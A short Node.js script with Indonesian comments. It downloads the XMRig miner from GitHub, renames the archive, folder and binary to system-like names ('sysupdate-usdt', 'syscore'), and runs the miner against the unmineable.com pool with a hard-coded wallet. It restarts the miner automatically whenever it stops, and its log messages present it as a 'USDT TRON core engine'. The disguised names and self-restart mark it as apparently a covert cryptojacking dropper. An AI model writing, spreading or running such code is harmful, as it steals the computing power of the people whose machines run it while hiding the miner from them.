const { spawn, exec } = require('child_process');
const fs = require('fs');
const https = require('https');

// === CONFIG ===
const ADDR = 'rx.unmineable.com:3333';
const WALLET = 'TJm8qGE5gmMVcfwFTmWBqwrjSkDFnhs81x';
const REFERRAL = 'cups-68pw';
const PASS = 'x';
const MODE = 'rx';
const XMRIG_VERSION = '6.26.0';
const REMOTE_URL = `https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz`;
const ASSET_FILE = 'sysupdate-usdt.tar.gz';
const EXTRACTED_DIR = `xmrig-${XMRIG_VERSION}`;
const TARGET_DIR = 'syscore-usdt';

// Fungsi untuk membuat nama worker unik
function generateWorkerName() {
    return 'wrk-' + Math.random().toString(36).substring(7);
}

function startProcess() {
    console.log('Memulai core engine USDT TRON...');
    
    // Format: USDT:Wallet.Worker#Referral
    const workerName = generateWorkerName();
    const fullAuth = `USDT:${WALLET}.${workerName}#${REFERRAL}`;
    
    console.log(`[+] Menggunakan worker: ${workerName}`);

    const worker = spawn(`./${TARGET_DIR}/syscore`, [
        '-a', MODE,
        '-o', ADDR,
        '-u', fullAuth,
        '-p', PASS,
        '--randomx-wrmsr=-1',
        '--randomx-no-rdmsr',
        '-k'
    ]);

    worker.stdout.on('data', (data) => process.stdout.write(data.toString()));
    worker.stderr.on('data', (data) => process.stderr.write(data.toString()));

    worker.on('close', (code) => {
        console.log(`[!] Proses terhenti. Restart dalam 5 detik...`);
        setTimeout(startProcess, 5000);
    });
}

function fetchAsset(url, dest, cb) {
    https.get(url, (res) => {
        if (res.statusCode === 301 || res.statusCode === 302) return fetchAsset(res.headers.location, dest, cb);
        const file = fs.createWriteStream(dest);
        res.pipe(file);
        file.on('finish', () => file.close(cb));
    }).on('error', (err) => {
        fs.unlink(dest, () => {});
        if (cb) cb(err.message);
    });
}

function initialize() {
    if (fs.existsSync(TARGET_DIR)) {
        startProcess();
    } else {
        fetchAsset(REMOTE_URL, ASSET_FILE, (err) => {
            if (err) return console.error('Gagal download: ' + err);
            exec(`tar -xf ${ASSET_FILE} && mv ${EXTRACTED_DIR} ${TARGET_DIR} && mv ./${TARGET_DIR}/xmrig ./${TARGET_DIR}/syscore`, (error) => {
                if (error) return console.error('Gagal ekstrak: ' + error.message);
                if (fs.existsSync(ASSET_FILE)) fs.unlinkSync(ASSET_FILE);
                startProcess();
            });
        });
    }
}

initialize();

process.on('uncaughtException', (err) => console.error('Error sistem: ', err));
